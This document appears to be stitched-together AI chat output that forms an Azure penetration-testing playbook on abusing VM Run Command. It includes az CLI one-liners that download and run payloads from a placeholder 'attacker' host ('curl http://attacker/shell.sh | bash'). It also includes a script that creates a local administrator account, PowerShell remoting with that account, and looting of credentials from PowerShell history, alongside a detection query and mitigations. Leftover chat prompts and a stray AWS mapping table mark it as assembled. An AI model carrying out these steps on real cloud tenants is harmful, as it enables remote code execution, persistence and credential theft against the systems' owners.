# Execute Commands on Virtual Machine using Run Command

Here’s a corrected, rewritten, and summarized version of the text in the
context of **Azure penetration testing**:

**Abusing Azure Run Command for VM Command Execution**

In Azure, the **Run Command** feature allows administrators to remotely
execute PowerShell (Windows) or shell (Linux) scripts on virtual
machines. From an attacker's perspective, this can be a powerful method
of post-exploitation if they gain sufficient privileges (e.g.,
Contributor or Virtual Machine Contributor roles).

**⚠️ Security Risk**

If misconfigured or unmonitored, **Run Command** can be abused to run
arbitrary commands with **elevated privileges** (typically as NT
AUTHORITY\SYSTEM on Windows or root on Linux). Attackers can exploit
this to:

- Execute malware or reverse shells.

- Harvest credentials.

- Perform lateral movement or persistence actions.

**❌ Insecure Use (Example)**

{

"location": "\<vm-location\>",

"properties": {

"commandId": "RunPowerShellScript",

"script": "\<malicious-script\>",

"timeoutInSeconds": 60

}

}

- This example directly injects a potentially malicious script.

- Lacks input validation, monitoring, or script approval.

- Represents an attacker's post-exploitation tactic.

**✅ Secure Usage (Mitigation Best Practices)**

{

"location": "\<vm-location\>",

"properties": {

"commandId": "RunPowerShellScript",

"script": "\<approved-script\>",

"timeoutInSeconds": 60,

"parameters": \[\]

}

}

- Uses pre-approved scripts only.

- Implements input validation and monitoring.

- Avoids dynamic user input that could be exploited.

**🔐 Mitigation Recommendations**

- **Restrict permissions**: Limit who can run commands via Azure RBAC.

- **Log and monitor**: Use Azure Activity Logs and Microsoft Defender
  for Cloud.

- **Script approval**: Only allow execution of vetted scripts from
  secure storage.

- **Disable Run Command** if not needed, or use Just-in-Time (JIT) VM
  access.

Would you like this integrated into a larger post-exploitation or
detection-focused Azure playbook?

Great — I’ll integrate this into your Azure post-exploitation and
detection playbook. Here’s how the **Run Command abuse section** would
look as part of the larger structure:

**🛠️ Azure Post-Exploitation Playbook: VM Run Command Abuse**

**Objective**

Leverage Azure’s **Run Command** to execute commands on target virtual
machines (VMs) after gaining appropriate Azure permissions (e.g.,
Contributor, VM Contributor).

**🧱 Prerequisites**

- Access token or role with
  Microsoft.Compute/virtualMachines/runCommand/action permissions.

- Target VM must be running and accessible via the Azure portal or CLI.

**⚔️ Attack: Abuse Run Command for Code Execution**

**💣 Example (Windows PowerShell)**

az vm run-command invoke \\

--resource-group MyRG \\

--name TargetVM \\

--command-id RunPowerShellScript \\

--scripts "Invoke-WebRequest http://attacker/payload.ps1 -OutFile
C:\\temp\\payload.ps1; Start-Process C:\\temp\\payload.ps1"

**💣 Example (Linux Shell)**

az vm run-command invoke \\

--resource-group MyRG \\

--name TargetVM \\

--command-id RunShellScript \\

--scripts "curl http://attacker/shell.sh \| bash"

**📛 Detection Strategy**

| **Source** | **Signal** |
|----|----|
| Azure Activity Logs | Microsoft.Compute/virtualMachines/runCommand/action |
| Microsoft Defender for Cloud | Alert on suspicious script execution |
| Log Analytics / Sentinel | Look for frequent or out-of-hours RunCommand activity |

Sample KQL:

AzureActivity

\| where OperationNameValue ==
"Microsoft.Compute/virtualMachines/runCommand/action"

\| where ActivityStatusValue == "Success"

\| project TimeGenerated, Caller, ResourceGroup, Resource, Properties

**🛡️ Mitigation Controls**

- **RBAC Hardening**: Remove unnecessary Contributor or VM Contributor
  roles.

- **JIT Access**: Enable Just-In-Time VM Access to restrict exposure.

- **Script Approval Pipeline**: Only execute scripts stored in secure,
  version-controlled locations (e.g., GitHub with CI/CD).

- **Audit Logs**: Continuously ingest RunCommand logs into Sentinel for
  alerting and correlation.

Would you like the next section to cover persistence via VM extensions,
lateral movement, or another post-exploitation vector?

# Command Execution on Virtual Machines (VMs)

Here’s a **rewritten, corrected, and summarized version** of your
content in the context of **Azure penetration testing**, focusing on
abusing the *Run Command* feature and post-exploitation access of Azure
VMs:

**🔓 Attacking Azure: Command Execution on Virtual Machines (VMs)**

**Abusing Azure Run Command for Remote Code Execution**

In Azure, the Invoke-AzVMRunCommand feature allows administrators to
execute scripts on a VM without needing direct RDP or SSH access. This
capability can be **abused post-compromise** or via misconfigured IAM
permissions to gain **remote code execution (RCE)** on VMs from the
control plane.

**☁️ Step-by-Step Azure VM Command Execution**

**✅ 1. Authenticate with Azure**

\$accessToken = '\<ACCESS_TOKEN\>'

Connect-AzAccount -AccessToken \$accessToken -AccountId
'\<CLIENT_ID_OR_EMAIL\>'

**🕵️‍♂️ 2. Recon VM and Network Configuration**

\# Get VM network profile (NIC, NSG, IP configs)

Get-AzVM -Name '\<VM_NAME\>' -ResourceGroupName '\<RESOURCE_GROUP\>' \|
Select -ExpandProperty NetworkProfile

\# Get network interface details

Get-AzNetworkInterface -Name '\<NIC_NAME\>'

\# Query public IP (if any)

Get-AzPublicIpAddress -Name '\<PUBLIC_IP_RESOURCE_NAME\>'

**🔐 3. Verify Permissions (IAM Abuse)**

\# Check role assignments on the VM or scope

Get-AzRoleAssignment -Scope '\<RESOURCE_ID\>'

\# Check allowed actions of assigned role

Get-AzRoleDefinition -Name '\<ROLE_NAME\>'

**💣 4. Exploit: Execute a Script on VM via Azure Run Command**

Create a **malicious PowerShell script (e.g., adduser.ps1)**:

\# adduser.ps1

\$passwd = ConvertTo-SecureString "\<PASSWORD\>" -AsPlainText -Force

New-LocalUser -Name "\<USERNAME\>" -Password \$passwd

Add-LocalGroupMember -Group "Administrators" -Member "\<USERNAME\>"

Then execute it:

Invoke-AzVMRunCommand -VMName '\<VM_NAME\>' -ResourceGroupName
'\<RESOURCE_GROUP\>' \`

-CommandId 'RunPowerShellScript' -ScriptPath 'C:\Path\To\adduser.ps1'
-Verbose

☠️ **Impact**: Adds a local admin account to the VM without requiring
interactive login or network access.

**🧠 5. Post-Exploitation: Access VM via PowerShell Remoting**

\$passwd = ConvertTo-SecureString '\<PASSWORD\>' -AsPlainText -Force

\$creds = New-Object
System.Management.Automation.PSCredential('\<USERNAME\>', \$passwd)

\$sess = New-PSSession -ComputerName \<VM_PUBLIC_IP\> -Credential
\$creds \`

-SessionOption (New-PSSessionOption -ProxyAccessType NoProxyServer)

Enter-PSSession \$sess

**6. Looting Credentials from PowerShell History**

Get-Content
"C:\Users\\USERNAME\>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

**🎯 Pentest Takeaways:**

- **Invoke-AzVMRunCommand is a powerful control-plane RCE
  vector**—monitor and restrict who can execute it.

- **RBAC misconfigurations** (e.g., Contributor or Custom roles) can
  silently allow privilege escalation.

- **PowerShell history files** often leak credentials or other sensitive
  data—review them post-access.

Would you like this bundled into an **automated pentest script**, or
integrated with **Azure role enumeration tools**?

Here is the rewritten and summarized PowerShell script for executing
commands on an Azure VM during a penetration test. It includes:

- Azure authentication using a token

- Reconnaissance of VM network profile

- Role and permission checks

- Abuse of the Run Command feature to add a local admin

- Remote access via PowerShell

- Credential hunting via PowerShell history

Let me know if you need a version in Bash (using az cli) or want to
automate this further.

# Executing Discovery Commands on Azure VMs

**Azure CLI**

az vm run-command invoke --command-id RunShellScript \\

--name \<vm_name\> --resource-group \<resource_group\> \\

--scripts "\<command_1\>" "\<command_2\>" "\<command_3\>"

- Executes commands on an Azure VM using Azure RunCommand over the guest
  agent.

- This works if the VM agent is active and permissions allow it.

**Python (Azure SDK)**

from azure.mgmt.compute import ComputeManagementClient

from azure.identity import DefaultAzureCredential

compute_client = ComputeManagementClient(DefaultAzureCredential(),
"\<subscription_id\>")

compute_client.virtual_machines.begin_run_command(

resource_group_name="\<resource_group\>",

vm_name="\<vm_name\>",

parameters={

"command_id": "RunShellScript",

"script": \["\<command_1\>", "\<command_2\>", "\<command_3\>"\]

}

)

**Terraform**

terraform init

terraform import azurerm_virtual_machine.this
/subscriptions/\<sub_id\>/resourceGroups/\<rg\>/providers/Microsoft.Compute/virtualMachines/\<vm_name\>

terraform apply -auto-approve -var 'run_command="\<command_1\>;
\<command_2\>; \<command_3\>"'

**Summary Mapping**

| **AWS Concept**              | **Azure Equivalent**                      |
|------------------------------|-------------------------------------------|
| Deregister from Organization | Leave Tenant / Unsubscribe Subscription   |
| Delete Flow Logs             | Remove NSG Flow Logs                      |
| SSM RunShellScript           | Azure VM RunCommand                       |
| Boto3                        | Azure SDK for Python (via azure-identity) |
| Terraform AWS Modules        | Terraform AzureRM Provider Modules        |
